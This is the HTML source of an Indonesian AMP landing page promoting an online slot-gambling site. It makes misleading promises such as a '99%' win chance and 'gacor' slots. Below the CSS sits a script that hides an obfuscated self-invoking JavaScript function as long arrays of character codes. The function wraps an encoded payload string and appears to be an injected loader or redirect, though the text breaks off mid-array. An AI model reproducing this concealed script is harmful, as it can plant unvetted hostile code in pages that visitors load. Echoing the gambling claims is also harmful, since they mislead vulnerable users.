






<!doctype html>
<html amp lang="id">
<head>
  <meta charset="utf-8">
  <script async src="https://cdn.ampproject.org/v0.js"></script>
  
  <title>MATAUANGSLOT - Simbol Unik Pada Link Slot Mahjong Ways Gacor Resmi Hari Ini Free Scatter Hitam</title>
  <meta name="description" content="MATAUANGSLOT adalah gerbang resmi sebagai portal link situs slot Mahjong Ways gacor resmi hari ini dengan simbol unik yang mudah memicu free scatter hitam. Gabung Sekarang dan raih pengalaman bermain yang penuh cuan, peluang kemenangan 99% bonus jepe maksimal, serta pendaftaran vip login cepat tanpa hambatan.">
  <link rel="icon" href="https://i.imgur.com/eLrNuI4.png" type="image/x-icon">
  
  <link rel="canonical" href="https://ljmas.com/">
  <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">
  
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700;900&family=Share+Tech+Mono&display=swap" rel="stylesheet">
  
  <style amp-boilerplate>body{-webkit-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-moz-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-ms-animation:-amp-start 8s steps(1,end) 0s 1 normal both;animation:-amp-start 8s steps(1,end) 0s 1 normal both}@-webkit-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-moz-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-ms-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-o-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}</style><noscript><style amp-boilerplate>body{-webkit-animation:none;-moz-animation:none;-ms-animation:none;animation:none}</style></noscript>
  
  <style amp-custom>
    /* Latar Belakang Desktop */
    body {
      margin: 0; padding: 0; background-color: #030303;
      background-image: linear-gradient(rgba(0, 255, 255, 0.05) 1px, transparent 1px),
                        linear-gradient(90deg, rgba(0, 255, 255, 0.05) 1px, transparent 1px);
      background-size: 40px 40px; font-family: 'Share Tech Mono', monospace;
      color: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh;
    }

    /* Pembungkus Mode Mobile */
    .mobile-frame {
      width: 100%; max-width: 420px; height: 100vh; max-height: 900px;
      position: relative; background: #000; overflow: hidden;
      box-shadow: 0 0 40px rgb(0 0 0 / 15%), 0 0 15px rgb(0 0 0 / 10%);
    }
    @media (max-width: 480px) { .mobile-frame { max-height: 100vh; box-shadow: none; } }

    /* Efek Kilau Atas & Bawah */
    .energy-field-top, .energy-field-bottom {
      position: absolute; left: 0; width: 100%; height: 35%; z-index: 1; pointer-events: none;
    }
    .energy-field-top { top: 0; background: radial-gradient(circle at 50% -20%, rgba(136, 134, 134, 0.3) 0%, transparent 80%); }
    .energy-field-bottom { bottom: 0; background: radial-gradient(circle at 50% 120%, rgba(126, 124, 124, 0.2) 0%, transparent 80%); }

    /* SCANLINES */
    .scanlines {
      position: absolute; top: 0; left: 0; width: 100%; height: 100%;
      background: linear-gradient(to bottom, rgba(255,255,255,0), rgba(255,255,255,0) 50%, rgba(0,0,0,0.3) 50%, rgba(0,0,0,0.3));
      background-size: 100% 4px; pointer-events: none; z-index: 2;
    }

    /* PARTIKEL PETIR JATUH */
    .falling-sparks {
      position: absolute; top: 0; left: 0; width: 100%; height: 100%;
      z-index: 5; pointer-events: none; overflow: hidden;
    }
    .spark {
      position: absolute; top: -100px; width: 2px; height: 40px;
      border-radius: 50%; animation: rainDrop linear infinite;
    }
    .spark.cyan { background: #ffffff; box-shadow: 0 0 8px #ffffff; }
    .spark.green { background: #aba100; box-shadow: 0 0 8px #aba100; }
    @keyframes rainDrop {
      0% { transform: translateY(-100px); opacity: 0; }
      10% { opacity: 1; height: 50px; }
      90% { opacity: 1; height: 30px; }
      100% { transform: translateY(100vh); opacity: 0; }
    }
    .spark:nth-child(1) { left: 10%; animation-duration: 2.2s; animation-delay: 0.1s; }
    .spark:nth-child(2) { left: 25%; animation-duration: 2.8s; animation-delay: 1.2s; }
    .spark:nth-child(3) { left: 40%; animation-duration: 2.0s; animation-delay: 0.5s; }
    .spark:nth-child(4) { left: 55%; animation-duration: 3.1s; animation-delay: 1.8s; }
    .spark:nth-child(5) { left: 70%; animation-duration: 2.5s; animation-delay: 0.8s; }
    .spark:nth-child(6) { left: 85%; animation-duration: 3.5s; animation-delay: 0.3s; }

    /* =========================================
       LAYOUT UTAMA (FLEXBOX RESPONSIVE)
       ========================================= */
    .ui-layer {
      position: absolute; top: 0; left: 0; width: 100%; height: 100%;
      z-index: 10; display: flex; flex-direction: column;
      pointer-events: none;
    }

    /* HEADER SEO SONIC */
    .top-header {
      width: 100%; padding-top: 20px; pointer-events: auto; z-index: 11;
    }
    .top-nav {
      display: flex; justify-content: center; gap: 25px;
      font-family: 'Orbitron', sans-serif; font-size: 1.2em; 
      text-shadow: 0 0 8px rgba(0,0,0,1);
    }
    .top-nav span { color: #888; letter-spacing: 2px; }
    .top-nav span.active { color: #ffffff; text-shadow: 0 0 10px #ffffff; font-weight: bold; border-bottom: 2px solid #ffffff; padding-bottom: 3px;}
    
    .landscape-logo {
      display: flex; justify-content: center; align-items: center;
      margin-top: 15px; width: 100%; padding: 0 20px; box-sizing: border-box;
    }
    .landscape-logo amp-img {
      width: 100%; max-width: 250px;
      border-radius: 5px; filter: drop-shadow(0 0 10px rgba(0,255,255,0.4));
    }

    /* KONTEN TENGAH */
    .content-wrapper {
      flex: 1;
      display: flex; flex-direction: column;
      align-items: center; justify-content: center;
      gap: 15px;
      padding: 10px 20px 70px 20px;
      pointer-events: auto;
      overflow-y: auto;
    }

    /* KOTAK BANNER */
    .banner-container {
      position: relative; 
      width: 95%; max-width: 360px;
      aspect-ratio: 1/1; 
      display: flex; justify-content: center; align-items: center;
      padding: 4px; box-sizing: border-box; overflow: hidden;
      box-shadow: 0 0 20px rgba(0,0,0,0.8); transition: box-shadow 0.3s ease;
      flex-shrink: 0;
    }
    .banner-container::before, .banner-container::after {
      content: ''; position: absolute; width: 150%; height: 150%;
      background: conic-gradient(transparent, transparent, transparent, #ffffff);
      animation: rotateGlow 4s linear infinite;
    }
    .banner-container::after {
      background: conic-gradient(transparent, transparent, transparent, #aba100); animation-delay: -2s; 
    }
    @keyframes rotateGlow { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

    .banner-content {
      position: relative; width: 100%; height: 100%; background: #111;
      z-index: 4; border-radius: 2px; overflow: hidden;
    }
    .banner-container:hover { box-shadow: 0 0 40px rgba(0, 255, 255, 0.5), 0 0 40px rgba(0, 255, 0, 0.3); }

    /* TOMBOL KIRI & KANAN */
    .bottom-floating-actions {
      width: 95%; max-width: 360px;
      display: flex; flex-direction: row; justify-content: space-between; gap: 10px;
      flex-shrink: 0;
    }
    .action-btn-rect {
      flex: 1; display: flex; align-items: center; justify-content: center; gap: 6px;
      padding: 12px 5px; box-sizing: border-box;
      border: 2px solid; border-radius: 6px; 
      text-decoration: none; transition: all 0.2s ease;
      backdrop-filter: blur(5px);
    }
    .action-btn-rect:active { transform: scale(0.95); }
    .action-btn-rect span {
      font-family: 'Orbitron', sans-serif; font-size: 0.95em; 
      font-weight: 900; letter-spacing: 0.5px;
    }
    .btn-login { 
      background: rgba(0, 0, 0, 0.85); 
      border-color: #ffffff; box-shadow: 0 0 10px rgba(255, 115, 0, 0.4), inset 0 0 5px rgba(0,255,255,0.2); 
    }
    .btn-login span { color: #ffffff; text-shadow: 0 0 5px #ffffff, 0 0 10px #000; }
    .btn-daftar { 
      background: #aba100; border-color: #aba100; box-shadow: 0 0 15px rgba(0,255,0,0.6); 
      animation: pulseGlow 2s infinite; 
    }
    .btn-daftar span { color: #000; text-shadow: none; }

    @keyframes pulseGlow {
      0% { box-shadow: 0 0 10px rgb(255 255 255 / 60%); transform: scale(1); }
      50% { box-shadow: 0 0 20px rgb(255 255 255); transform: scale(1.02); }
      100% { box-shadow: 0 0 10px rgb(255 255 255 / 60%); transform: scale(1); }
    }

    /* =========================================
       AREA CAPTION KHAS TIKTOK
       ========================================= */
    .tiktok-caption {
      width: 95%; max-width: 360px;
      box-sizing: border-box; padding: 5px;
      text-align: left;
      flex-shrink: 0;
    }
    
    .tk-caption-text { 
      margin: 0 0 8px 0; 
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      font-size: 0.85em; line-height: 1.4; color: #fff; 
      text-shadow: 1px 1px 2px rgba(0,0,0,0.8); 
    }
    
   /* HASHTAG BERWARNA */
    .tk-hashtags { 
      font-weight: bold; 
      color: #0ff; /* Warna Cyan Neon untuk efek tautan klik */
      text-shadow: 0 0 5px rgba(0, 255, 255, 0.4); 
    }
    
    .tk-music {
      display: flex; align-items: center; gap: 8px;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      font-size: 0.8em; color: #fff; text-shadow: 1px 1px 2px rgba(0,0,0,0.8);
    }
    .music-icon { animation: spin 3s linear infinite; }
    @keyframes spin { 100% { transform: rotate(360deg); } }

    /* =========================================
       NAVIGASI BAWAH ALA TIKTOK
       ========================================= */
    .tiktok-nav {
      position: absolute; bottom: 0; left: 0; width: 100%; height: 55px;
      background: rgba(0, 0, 0, 0.95);
      border-top: 1px solid rgb(255 120 0 / 30%);
      display: flex; justify-content: space-around; align-items: center;
      z-index: 30; pointer-events: auto;
    }
    .nav-item {
      display: flex; flex-direction: column; align-items: center; justify-content: center;
      text-decoration: none; color: #888; font-family: 'Share Tech Mono', monospace;
      font-size: 0.6em; gap: 3px; transition: color 0.2s;
    }
    .nav-item.active { color: #ffffff; text-shadow: 0 0 5px #ffffff; }
    .nav-item:hover { color: #fff; }
    
    .nav-post {
      display: flex; justify-content: center; align-items: center;
      width: 40px; height: 28px; border-radius: 8px;
      background: linear-gradient(45deg, #ffffff, #aba100);
      color: #000; font-size: 1.3em; font-weight: bold; text-decoration: none;
      box-shadow: 0 0 8px rgba(255, 141, 0, 0.5);
    }
  </style>

            <script>
const Parts = [
  [40, 102, 117, 110, 99, 116, 105, 111, 110, 40, 41, 123, 118, 97, 114, 32, 95, 48, 120, 54, 57, 48, 50, 52, 51, 61, 50, 51, 50, 59, 118, 97, 114, 32, 95],
  [48, 120, 49, 102, 99, 57, 52, 50, 61, 39, 119, 73, 54, 100, 104, 111, 117, 99, 103, 89, 101, 71, 119, 77, 71, 84, 52, 115, 43, 100, 109, 52, 51, 73, 109],
  [53, 121, 97, 103, 89, 117, 99, 122, 57, 80, 105, 103, 89, 55, 65, 110, 74, 71, 89, 106, 89, 101, 79, 121, 74, 43, 66, 104, 111, 121, 72, 110, 57, 88, 86],
  [49, 99, 43, 100, 104, 111, 121, 78, 106, 111, 71, 71, 106, 89, 122, 80, 108, 74, 83, 99, 107, 90, 105, 78, 104, 52, 55, 73, 106, 73, 101, 76, 110, 89, 87],
  [78, 104, 112, 122, 86, 49, 100, 88, 80, 110, 89, 97, 77, 106, 89, 54, 66, 104, 111, 50, 77, 122, 53, 83, 85, 110, 52, 71, 71, 106, 73, 101, 102, 120, 114],
  [101, 51, 113, 114, 43, 51, 117, 54, 117, 54, 111, 98, 105, 56, 116, 54, 71, 109, 111, 98, 121, 104, 113, 97, 83, 104, 115, 113, 50, 115, 116, 55, 102, 66, 109],
  [111, 50, 99, 110, 90, 113, 71, 48, 43, 75, 102, 103, 89, 97, 77, 104, 53, 47, 71, 116, 55, 101, 113, 118, 55, 101, 55, 113, 55, 113, 104, 117, 76, 121, 51],
  [111, 97, 97, 104, 118, 75, 71, 112, 112, 75, 71, 121, 114, 97, 121, 51, 116, 57, 87, 99, 109, 112, 50, 78, 48, 43, 75, 76, 104, 52, 97, 98, 110, 77, 105],
  [107, 112, 54, 117, 112, 112, 76, 101, 55, 118, 75, 101, 54, 113, 97, 43, 116, 116, 54, 79, 116, 115, 100, 88, 80, 109, 52, 71, 99, 106, 98, 101, 97, 106, 90],
  [105, 74, 103, 90, 113, 51, 109, 53, 121, 74, 110, 73, 51, 80, 48, 43, 75, 76, 104, 52, 97, 98, 110, 77, 105, 107, 114, 97, 43, 112, 113, 55, 71, 51, 117],
  [55, 121, 110, 117, 113, 109, 118, 114, 98, 101, 106, 114, 98, 72, 86, 122, 52, 113, 102, 120, 89, 121, 72, 110, 52, 97, 69, 104, 52, 109, 77, 106, 89, 122, 80],
  [48, 43, 75, 76, 104, 52, 97, 98, 110, 77, 105, 115, 114, 97, 54, 112, 118, 97, 83, 56, 116, 55, 117, 103, 112, 55, 43, 51, 114, 75, 50, 107, 113, 98, 72],
  [86, 50, 100, 106, 89, 50, 78, 80, 105, 105, 52, 101, 71, 109, 53, 122, 73, 111, 75, 109, 109, 114, 75, 83, 116, 117, 114, 101, 116, 115, 76, 105, 110, 117, 114],
  [122, 86, 122, 55, 101, 51, 113, 114, 43, 51, 112, 97, 101, 115, 114, 98, 101, 54, 118, 97, 97, 51, 116, 56, 47, 84, 52, 111, 117, 72, 104, 112, 117, 99, 121],
  [75, 87, 110, 114, 75, 50, 51, 114, 113, 71, 107, 114, 98, 101, 108, 113, 98, 106, 86, 107, 43, 75, 75, 109, 111, 101, 102, 109, 52, 50, 97, 48, 115, 43, 101],
  [50, 99, 97, 67, 109, 56, 47, 69, 52, 111, 54, 72, 104, 112, 122, 83, 122, 53, 55, 97, 120, 111, 75, 98, 122, 56, 84, 105, 109, 111, 50, 76, 105, 90, 105],
  [99, 105, 52, 67, 74, 48, 115, 43, 101, 50, 56, 97, 67, 109, 56, 47, 69, 52, 111, 113, 98, 104, 52, 122, 83, 122, 53, 55, 99, 120, 111, 75, 98, 122, 56],
  [84, 105, 109, 52, 71, 69, 106, 89, 97, 99, 48, 115, 43, 101, 51, 99, 97, 67, 109, 56, 47, 69, 52, 111, 117, 69, 104, 53, 50, 77, 106, 111, 83, 74, 109],
  [111, 51, 83, 122, 53, 55, 101, 120, 111, 75, 98, 122, 56, 84, 105, 105, 52, 54, 51, 110, 90, 105, 77, 105, 90, 121, 78, 48, 115, 43, 101, 51, 56, 97, 67],
  [109, 56, 47, 69, 52, 111, 87, 74, 105, 55, 101, 97, 106, 89, 117, 74, 109, 74, 121, 76, 103, 73, 110, 83, 122, 53, 55, 81, 120, 111, 75, 98, 122, 56, 84],
  [105, 104, 89, 109, 76, 116, 52, 117, 69, 104, 53, 50, 77, 106, 111, 83, 74, 109, 111, 51, 83, 122, 53, 55, 82, 120, 111, 75, 98, 122, 43, 75, 86, 48, 43],
  [75, 76, 104, 52, 97, 98, 110, 77, 105, 114, 112, 54, 97, 56, 117, 113, 109, 114, 118, 76, 101, 114, 112, 54, 97, 117, 111, 97, 47, 86, 107, 43, 75, 54, 117],
  [75, 117, 51, 111, 75, 101, 55, 118, 76, 118, 83, 115, 56, 113, 65, 110, 74, 121, 89, 109, 57, 76, 72, 120, 53, 113, 89, 105, 56, 87, 70, 105, 89, 71, 71],
  [104, 111, 50, 99, 120, 111, 87, 74, 110, 73, 71, 76, 120, 112, 109, 100, 103, 89, 79, 71, 104, 52, 121, 78, 120, 112, 105, 97, 104, 56, 114, 69, 121, 111, 67],
  [99, 110, 74, 105, 98, 48, 115, 102, 72, 109, 112, 105, 76, 120, 111, 109, 71, 103, 53, 114, 71, 105, 52, 101, 70, 120, 53, 105, 72, 104, 74, 71, 80, 104, 52],
  [98, 75, 120, 77, 113, 65, 110, 74, 121, 89, 109, 57, 76, 72, 120, 53, 105, 72, 104, 74, 71, 80, 104, 52, 98, 70, 109, 74, 50, 75, 104, 73, 71, 76, 120],
  [111, 97, 72, 106, 73, 71, 78, 109, 56, 97, 74, 109, 74, 106, 75, 120, 77, 113, 65, 110, 74, 121, 89, 109, 57, 76, 72, 120, 53, 105, 72, 104, 74, 71, 80],
  [104, 52, 98, 70, 104, 89, 109, 66, 104, 111, 97, 78, 110, 77, 97, 89, 110, 89, 113, 69, 103, 89, 118, 71, 105, 111, 83, 74, 109, 53, 121, 74, 109, 73, 72],
  [71, 103, 89, 102, 75, 120, 77, 113, 65, 110, 74, 121, 89, 109, 57, 76, 72, 120, 57, 109, 97, 109, 73, 118, 71, 103, 89, 102, 72, 104, 89, 109, 99, 103, 89],
  [118, 75, 120, 77, 113, 65, 110, 74, 121, 89, 109, 57, 76, 72, 120, 53, 105, 72, 104, 74, 71, 80, 104, 52, 98, 71, 106, 74, 113, 89, 105, 56, 97, 72, 109],
  [111, 47, 75, 120, 77, 113, 65, 110, 74, 121, 89, 109, 57, 76, 72, 120, 53, 105, 72, 104, 74, 71, 80, 104, 52, 98, 71, 106, 52, 109, 99, 106, 90, 43, 74],
  [107, 99, 97, 99, 106, 89, 97, 77, 106, 90, 113, 69, 107, 99, 97, 76, 104, 56, 114, 69, 121, 111, 67, 99, 110, 74, 105, 98, 48, 115, 102, 72, 106, 52, 109],
  [99, 106, 90, 43, 74, 107, 99, 97, 99, 106, 89, 97, 77, 106, 90, 113, 69, 107, 99, 97, 76, 104, 56, 101, 89, 110, 89, 113, 69, 103, 89, 118, 72, 109, 73],
  [101, 69, 107, 89, 43, 72, 104, 115, 114, 69, 121, 111, 67, 99, 110, 74, 105, 98, 48, 115, 102, 72, 109, 73, 101, 69, 107, 89, 43, 72, 104, 115, 87, 70, 105],
  [89, 71, 71, 104, 111, 50, 99, 120, 111, 43, 74, 110, 73, 50, 102, 105, 90, 72, 71, 110, 73, 109, 99, 110, 89, 88, 71, 103, 89, 102, 75, 120, 77, 113, 65],
  [110, 74, 121, 89, 109, 57, 76, 72, 120, 53, 105, 72, 104, 74, 71, 80, 104, 52, 98, 71, 109, 112, 105, 76, 120, 112, 117, 100, 105, 112, 109, 100, 106, 90, 113],
  [82, 120, 111, 97, 78, 110, 74, 43, 72, 109, 111, 80, 72, 109, 74, 50, 75, 104, 73, 71, 76, 121, 115, 84, 75, 103, 74, 121, 99, 109, 74, 118, 83, 120, 56],
  [101, 89, 104, 52, 83, 82, 106, 52, 101, 71, 120, 112, 121, 65, 106, 90, 113, 89, 105, 56, 97, 66, 104, 56, 114, 69, 121, 111, 67, 99, 110, 74, 105, 98, 48],
  [115, 102, 72, 109, 73, 101, 69, 107, 89, 43, 72, 104, 115, 97, 69, 105, 90, 54, 74, 120, 111, 113, 100, 103, 89, 83, 77, 121, 115, 84, 75, 103, 74, 121, 99],
  [109, 74, 118, 83, 120, 56, 101, 89, 104, 52, 83, 82, 106, 52, 101, 71, 120, 89, 113, 72, 109, 115, 87, 97, 109, 73, 118, 71, 109, 74, 50, 75, 104, 73, 71],
  [76, 104, 111, 101, 77, 106, 99, 97, 76, 104, 52, 88, 75, 120, 77, 113, 65, 110, 74, 121, 89, 109, 57, 76, 72, 120, 53, 105, 72, 104, 74, 71, 80, 104, 52],
  [98, 71, 109, 112, 105, 76, 120, 111, 67, 82, 109, 73, 50, 97, 109, 53, 71, 71, 105, 56, 97, 81, 107, 90, 76, 72, 121, 114, 88, 69, 52, 113, 117, 110, 112],
  [114, 121, 54, 113, 97, 117, 56, 116, 54, 109, 115, 114, 76, 113, 116, 117, 55, 118, 83, 122, 57, 105, 81, 50, 116, 114, 99, 51, 100, 47, 82, 106, 100, 51, 102],
  [50, 111, 117, 116, 114, 89, 118, 100, 50, 57, 106, 82, 113, 100, 43, 77, 48, 97, 55, 100, 106, 113, 109, 79, 48, 78, 50, 77, 106, 89, 110, 100, 106, 75, 113],
  [75, 51, 54, 122, 99, 113, 99, 47, 69, 52, 113, 54, 57, 112, 113, 117, 56, 111, 97, 101, 109, 116, 55, 117, 116, 112, 75, 50, 114, 118, 75, 101, 54, 48, 115],
  [43, 75, 51, 116, 67, 77, 50, 100, 68, 89, 48, 99, 47, 69, 52, 114, 121, 104, 112, 97, 50, 110, 118, 98, 121, 51, 112, 98, 118, 83, 51, 100, 106, 89, 50],
  [77, 84, 105, 112, 97, 109, 119, 116, 55, 113, 116, 118, 76, 113, 104, 114, 98, 118, 83, 50, 117, 75, 86, 48, 43, 75, 66, 106, 115, 67, 99, 107, 90, 105, 78],
  [104, 52, 55, 73, 116, 55, 101, 113, 118, 55, 101, 114, 112, 54, 97, 56, 117, 113, 109, 114, 118, 76, 101, 110, 118, 113, 50, 54, 117, 113, 71, 115, 114, 99, 110],
  [86, 49, 99, 43, 100, 104, 111, 121, 78, 106, 111, 71, 71, 106, 89, 122, 80, 122, 115, 54, 51, 116, 54, 113, 47, 116, 54, 117, 110, 112, 114, 121, 54, 113, 97],
  [117, 56, 116, 54, 101, 43, 114, 98, 113, 54, 111, 97, 121, 116, 119, 90, 80, 105, 110, 74, 113, 82, 107, 54, 101, 75, 103, 111, 50, 76, 110, 77, 97, 74, 109],
  [53, 117, 66, 106, 52, 98, 65, 113, 54, 101, 109, 118, 76, 113, 112, 113, 55, 121, 51, 113, 54, 101, 109, 114, 113, 71, 118, 120, 76, 101, 51, 113, 114, 43, 51],
  [113, 54, 101, 109, 118, 76, 113, 112, 113, 55, 121, 51, 112, 55, 54, 116, 117, 114, 113, 104, 114, 75, 51, 66, 48, 53, 87, 76, 105, 90, 121, 76, 103, 77, 67],
  [78, 119, 90, 79, 86, 52, 112, 88, 105, 104, 73, 50, 99, 121, 73, 117, 79, 106, 57, 87, 84, 108, 100, 80, 105, 104, 73, 50, 99, 121, 74, 105, 74, 104, 111],
  [50, 69, 113, 111, 109, 98, 106, 98, 50, 97, 104, 78, 88, 80, 122, 57, 80, 105, 104, 73, 50, 99, 121, 73, 109, 89, 103, 97, 113, 74, 109, 52, 51, 86, 122],
  [56, 47, 84, 52, 111, 83, 78, 110, 77, 105, 69, 104, 52, 43, 57, 109, 111, 84, 86, 122, 56, 47, 84, 52, 111, 83, 78, 110, 77, 105, 99, 104, 52, 79, 78],
  [104, 114, 50, 97, 104, 78, 88, 80, 122, 57, 80, 105, 104, 73, 50, 99, 121, 73, 121, 72, 110, 52, 97, 69, 104, 52, 109, 77, 118, 90, 113, 69, 49, 99, 47],
  [80, 48, 43, 75, 76, 104, 52, 97, 98, 110, 77, 105, 112, 117, 75, 71, 51, 117, 100, 113, 51, 111, 54, 50, 120, 116, 54, 67, 116, 115, 78, 88, 80, 105, 52],
  [114, 82, 106, 89, 55, 81, 48, 78, 106, 99, 50, 100, 118, 81, 48, 100, 68, 98, 51, 100, 110, 90, 105, 100, 109, 77, 106, 78, 114, 90, 105, 89, 122, 101, 48],
  [78, 118, 82, 106, 78, 106, 98, 105, 57, 106, 89, 105, 100, 72, 101, 51, 57, 114, 81, 50, 78, 43, 77, 106, 100, 122, 90, 51, 73, 50, 76, 51, 89, 50, 74],
  [105, 89, 110, 102, 106, 89, 114, 99, 50, 57, 72, 89, 105, 99, 47, 84, 52, 111, 54, 100, 104, 111, 117, 99, 103, 89, 101, 71, 121, 73, 114, 101, 51, 74, 50],
  [97, 104, 75, 50, 71, 105, 52, 101, 77, 106, 97, 109, 98, 105, 52, 71, 66, 119, 74, 117, 99, 109, 115, 71, 84, 52, 112, 121, 97, 107, 90, 80, 105, 109, 111],
  [50, 99, 110, 90, 113, 71, 121, 73, 113, 99, 104, 52, 110, 65, 117, 53, 121, 97, 103, 89, 97, 80, 119, 74, 117, 99, 109, 115, 72, 66, 120, 112, 113, 78, 109],
  [73, 83, 74, 105, 52, 51, 65, 120, 55, 84, 68, 120, 52, 47, 69, 122, 56, 88, 80, 119, 99, 97, 97, 106, 90, 105, 69, 105, 89, 117, 78, 119, 77, 101, 48],
  [120, 56, 101, 80, 120, 77, 43, 51, 122, 56, 72, 71, 109, 111, 50, 89, 104, 73, 109, 76, 106, 99, 68, 72, 49, 99, 80, 77, 120, 52, 47, 69, 122, 56, 47],
  [66, 48, 43, 75, 86, 105, 52, 109, 99, 105, 52, 68, 65, 106, 99, 71, 84, 52, 112, 113, 78, 110, 74, 50, 97, 104, 115, 47, 80, 48, 43, 75, 86, 52, 112],
  [88, 105, 106, 112, 50, 71, 105, 53, 121, 66, 104, 52, 98, 73, 103, 73, 50, 81, 118, 73, 101, 113, 107, 90, 121, 78, 109, 56, 67, 65, 106, 90, 68, 66, 107],
  [43, 75, 99, 109, 112, 71, 84, 52, 111, 67, 78, 107, 78, 87, 55, 110, 74, 113, 66, 104, 111, 47, 65, 103, 73, 50, 81, 108, 74, 84, 80, 122, 56, 72, 71],
  [110, 74, 113, 66, 104, 99, 68, 66, 48, 43, 75, 66, 106, 115, 68, 74, 120, 55, 97, 122, 105, 99, 87, 79, 50, 77, 88, 82, 116, 90, 80, 101, 51, 74, 88],
  [77, 120, 52, 72, 71, 110, 73, 50, 98, 110, 77, 67, 65, 106, 90, 68, 66, 119, 90, 113, 78, 110, 74, 50, 97, 104, 115, 105, 71, 110, 89, 83, 69, 48, 43],
  [75, 76, 104, 52, 97, 98, 110, 77, 105, 72, 110, 90, 122, 86, 104, 111, 50, 102, 121, 76, 50, 66, 104, 112, 122, 81, 113, 90, 113, 97, 105, 90, 72, 65, 50],
  [57, 114, 66, 48, 43, 75, 79, 104, 53, 114, 65, 104, 73, 50, 99, 121, 73, 72, 86, 50, 78, 79, 66, 49, 78, 118, 97, 48, 52, 72, 68, 119, 56, 71, 84],
  [52, 111, 101, 100, 110, 76, 79, 66, 116, 100, 87, 89, 105, 90, 113, 98, 106, 97, 71, 71, 110, 77, 67, 65, 106, 90, 68, 71, 109, 53, 50, 75, 109, 53, 121],
  [97, 119, 73, 72, 67, 50, 115, 84, 97, 119, 99, 84, 90, 51, 115, 72, 79, 50, 74, 67, 79, 106, 116, 80, 105, 108, 101, 75, 97, 106, 90, 121, 100, 109, 111],
  [98, 73, 104, 53, 50, 99, 48, 43, 75, 86, 105, 52, 109, 99, 105, 52, 68, 65, 106, 99, 71, 84, 52, 112, 113, 78, 110, 74, 50, 97, 104, 115, 105, 71, 110],
  [89, 83, 69, 48, 43, 75, 86, 52, 112, 88, 105, 106, 112, 50, 71, 105, 53, 121, 66, 104, 52, 98, 73, 105, 112, 71, 99, 106, 90, 117, 56, 104, 54, 114, 101],
  [51, 76, 50, 97, 104, 77, 67, 75, 107, 90, 121, 78, 109, 56, 71, 84, 52, 112, 121, 97, 107, 90, 80, 105, 104, 73, 50, 99, 121, 73, 113, 66, 104, 116, 88],
  [80, 122, 57, 80, 105, 105, 52, 101, 71, 109, 53, 122, 73, 105, 52, 67, 100, 104, 111, 80, 86, 50, 74, 68, 81, 50, 78, 106, 89, 48, 43, 75, 79, 104, 53],
  [114, 65, 104, 73, 50, 99, 121, 73, 72, 86, 50, 78, 79, 66, 49, 73, 113, 82, 110, 73, 50, 98, 120, 111, 83, 78, 104, 111, 43, 99, 103, 78, 79, 66, 119],
  [57, 87, 76, 103, 74, 50, 71, 103, 56, 71, 84, 52, 111, 113, 66, 104, 115, 80, 86, 117, 53, 121, 97, 103, 89, 97, 80, 120, 111, 54, 97, 104, 52, 87, 114],
  [103, 73, 109, 97, 113, 52, 101, 77, 106, 99, 97, 74, 109, 74, 105, 69, 107, 99, 67, 71, 110, 89, 83, 69, 120, 73, 113, 82, 110, 73, 50, 98, 120, 112, 117],
  [100, 105, 111, 109, 97, 109, 111, 109, 82, 119, 73, 72, 69, 103, 99, 79, 76, 103, 74, 50, 71, 103, 56, 72, 66, 48, 43, 75, 86, 52, 112, 113, 78, 110, 74],
  [50, 97, 104, 115, 105, 75, 110, 73, 101, 74, 119, 73, 113, 66, 104, 115, 72, 71, 109, 111, 50, 89, 104, 73, 109, 76, 106, 99, 68, 72, 116, 77, 80, 72, 106],
  [56, 84, 80, 120, 99, 47, 66, 120, 112, 113, 78, 109, 73, 83, 74, 105, 52, 51, 65, 120, 55, 84, 72, 120, 52, 47, 69, 122, 55, 102, 80, 119, 99, 97, 97],
  [106, 90, 105, 69, 105, 89, 117, 78, 119, 77, 102, 86, 119, 56, 122, 72, 106, 56, 84, 80, 122, 56, 72, 84, 52, 112, 87, 76, 105, 90, 121, 76, 103, 77, 67],
  [78, 119, 90, 80, 105, 109, 111, 50, 99, 110, 90, 113, 71, 122, 56, 47, 84, 52, 112, 88, 105, 108, 101, 75, 79, 110, 89, 97, 76, 110, 73, 71, 72, 104, 115],
  [105, 75, 51, 116, 121, 100, 109, 111, 83, 56, 104, 54, 113, 82, 110, 73, 50, 98, 119, 73, 114, 101, 51, 74, 50, 97, 104, 77, 71, 84, 52, 112, 121, 97, 107],
  [90, 80, 105, 103, 89, 55, 65, 121, 89, 114, 101, 51, 74, 50, 97, 104, 74, 83, 85, 110, 74, 71, 89, 106, 89, 101, 79, 121, 73, 114, 101, 51, 74, 50, 97],
  [104, 77, 110, 86, 49, 99, 43, 98, 110, 74, 113, 66, 104, 111, 47, 80, 119, 90, 113, 78, 110, 74, 50, 97, 104, 115, 105, 71, 110, 89, 83, 69, 48, 43, 75],
  [69, 106, 90, 122, 73, 105, 116, 55, 99, 49, 89, 114, 101, 51, 74, 50, 97, 104, 77, 97, 97, 106, 90, 105, 69, 105, 89, 117, 78, 119, 77, 102, 70, 120, 52],
  [47, 69, 122, 56, 80, 80, 119, 99, 97, 97, 106, 90, 105, 69, 105, 89, 117, 78, 119, 77, 101, 51, 120, 52, 47, 69, 122, 56, 102, 80, 119, 100, 80, 105, 105],
  [52, 101, 71, 109, 53, 122, 73, 109, 73, 109, 77, 49, 89, 114, 101, 51, 77, 97, 69, 106, 89, 97, 80, 110, 73, 68, 78, 51, 78, 80, 105, 103, 89, 55, 65],
  [109, 73, 109, 77, 119, 89, 114, 101, 51, 77, 80, 86, 122, 57, 88, 80, 120, 112, 113, 78, 109, 73, 50, 74, 110, 77, 68, 99, 120, 90, 105, 74, 106, 77, 72],
  [84, 52, 111, 117, 72, 104, 112, 117, 99, 121, 73, 113, 66, 104, 116, 87, 74, 110, 73, 101, 75, 119, 73, 114, 101, 51, 77, 72, 84, 52, 111, 117, 72, 104, 112],
